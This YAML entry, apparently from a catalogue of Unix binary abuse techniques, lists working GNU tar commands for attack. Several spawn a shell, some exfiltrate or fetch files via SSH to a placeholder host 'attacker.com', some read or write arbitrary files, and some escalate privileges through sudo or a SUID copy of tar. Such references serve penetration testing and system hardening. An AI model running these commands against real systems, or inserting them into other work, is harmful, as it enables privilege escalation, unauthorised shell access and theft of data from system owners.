---
functions:
  shell:
    - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    - description: This only works for GNU tar.
      code: tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
    - description: This only works for GNU tar. It can be useful when only a limited command argument injection is available.
      code: |
        TF=$(mktemp)
        echo '/bin/sh 0<&1' > "$TF"
        tar cf "$TF.tar" "$TF"
        tar xf "$TF.tar" --to-command sh
        rm "$TF"*
  file-upload:
    - description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
      code: |
        RHOST=attacker.com
        RUSER=root
        RFILE=/tmp/file_to_send.tar
        LFILE=file_to_send
        tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
  file-download:
    - description: This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
      code: |
        RHOST=attacker.com
        RUSER=root
        RFILE=/tmp/file_to_get.tar
        tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
  file-write:
    - description: This only works for GNU tar.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA > "$TF"
        tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
  file-read:
    - description: This only works for GNU tar.
      code: |
        LFILE=file_to_read
        tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
  sudo:
    - code: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  limited-suid:
    - code: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
---
